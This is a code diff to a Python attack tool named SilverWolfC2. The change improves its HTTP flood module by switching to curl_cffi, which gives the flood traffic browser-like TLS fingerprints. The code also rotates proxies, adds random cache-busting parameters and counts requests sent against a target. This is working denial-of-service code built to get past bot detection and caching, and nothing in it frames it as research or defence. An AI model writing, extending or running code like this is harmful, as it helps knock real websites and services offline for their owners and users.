@@ -43,7 +43,8 @@ import json
 
 # Optional modules (handled gracefully if missing)
 try:
-    from requests_impersonate import Session as ImpersonatedSession
+    from curl_cffi.requests import Session as ImpersonatedSession
+    from curl_cffi import CurlHttpVersion
     HAS_IMPERSONATE = True
 except ImportError:
     HAS_IMPERSONATE = False
@@ -1323,20 +1324,23 @@ class SilverWolfC2:
                 }
                 proxy = f"http://{random.choice(self.proxies)}" if use_proxies and self.proxies else None
                 cache_buster = f"?_={int(time.time()*1000)}&r={secrets.token_hex(16)}"
+
+                # Use curl_cffi for browser-like TLS fingerprint
                 if HAS_IMPERSONATE:
-                    imp_session = ImpersonatedSession()
-                    async with imp_session.get(url + cache_buster, headers=headers, proxy=proxy, ssl=False) as response:
-                        await response.read()
+                    with ImpersonatedSession() as imp_session:
+                        imp_session.get(url + cache_buster, headers=headers, proxies={"http": proxy, "https": proxy} if proxy else None)
                 else:
-                    async with session.get(url + cache_buster, headers=headers, proxy=proxy, ssl=False) as response:
-                        await response.read()
+                    # Fallback to regular requests
+                    requests.get(url + cache_buster, headers=headers, proxies={"http": proxy, "https": proxy} if proxy else None)
+
                 self.attack_stats['requests_sent'] += 1
                 self.attack_module_stats['http_flood'] += 1
+
             except Exception as e:
                 if "Cannot connect to host" not in str(e):
                     if hasattr(self, 'logger'):
                         self.logger.debug(f"HTTP flood error: {e}")
-                await asyncio.sleep(0.1)
+                time.sleep(0.1)
 
     # --- Main Orchestrator ---
     async def start_attack(self, target, port, bytes_per_sec, threads, duration, use_proxies, attack_type, save_attack, target_url, use_spoofing=False):
